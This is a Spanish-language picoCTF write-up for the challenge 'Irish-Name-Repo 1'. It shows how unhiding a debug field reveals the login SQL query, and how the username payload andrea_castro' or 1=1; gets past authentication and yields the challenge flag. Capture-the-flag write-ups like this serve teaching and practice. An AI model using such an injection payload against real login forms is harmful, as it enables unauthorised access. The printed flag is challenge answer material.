# Irish-Name-Repo 1
## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

## Soluciòn
Vemos que no podemos dar click en las imagenes, ademas notamos un menu en la esquina superior, vemos 3 partes, la que nos interesa es admin login
Si nos vamos ahi vemos unos cuadros de texto para hacer login, en las pistas nos dice que usemos inyeccion de SQL.
Al inspeccionar el login, vemos que un cuadro de Texto llamado debug se encuentra oculto, justo al lado del boton Login, si quitamos el hidden en debug y escribimos algun usuario, algun password y se abre un ultimo campo, al cual le ponemos "1", asì podemos ver que al mandar el login nos aparece la consulta.

```HTML
<input name="debug" value="0" type="hidden">

<input name="debug" value="0" type="">
```
![[Screenshot_2022-10-07_15_39_50.png]]

Al dar click nos manda a otra pàgina que nos dirà
```shell
username: andrea_castro
password: 1234
SQL query: SELECT * FROM users WHERE name='andrea_castro' AND password='1234'

# Login failed.
```

Al inyectar codigo SQL podemos cambiar el como se verifica la contraseña y usuario que se nos está pidiendo, si se agrega el "or 1=1", como esta parte siempre es verdadera, podemos ingresar y obtener la bandera.

```
username: andrea_castr0
password: 1234
SQL query: SELECT * FROM users WHERE name='andrea_castro' AND password='1234'

# Login failed.
```
podemos poner lo siguiente en el campo de username al volver a loggearnos
```
andrea_castro' or 1=1;
```
de pasword le ponemos cualquiera y  ponemos el 1 en el ùltimo campo.
![[Screenshot_2022-10-07_15_48_23.png]]

mandamos el login y nos arrojara la bandera enuna nueva pàgina.
```
username: andrea_castro' or 1=1;
password: 1234
SQL query: SELECT * FROM users WHERE name='andrea_castro' or 1=1;' AND password='1234'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}
```

picoCTF{s0m3_SQL_fb3fe2ad}

## Referencias
- []()